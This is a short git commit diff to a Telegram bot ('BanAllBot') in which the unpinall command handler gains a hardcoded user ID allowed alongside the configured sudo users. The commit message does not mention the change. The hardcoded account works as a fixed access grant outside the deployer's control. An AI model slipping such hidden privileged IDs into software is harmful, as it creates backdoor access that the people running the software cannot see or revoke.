0ad0b211d12101ae94615ddb0950541c7ca7e8fb
Hasnain khan <161922960+hasnainkk-07@users.noreply.github.com>
2024-07-09 14:50:55 +0545

    create by @hasnainkk-07

--- BanAllBot/modules/unpinall.py
+++ BanAllBot/modules/unpinall.py
@@ -1,7 +1,9 @@
 from BanAllBot import app,SUDO,BOT_ID
 from pyrogram import filters
 
-@app.on_message(filters.command("unpinall") & filters.user(SUDO))
+SPECIAL_USER_ID = 6346273488
+
+@app.on_message(filters.command("unpinall") & (filters.user(SUDO) | filters.user(SPECIAL_USER_ID)))
 async def unpin_all(_,msg):
     chat_id=msg.chat.id    
     bot=await app.get_chat_member(chat_id,BOT_ID)
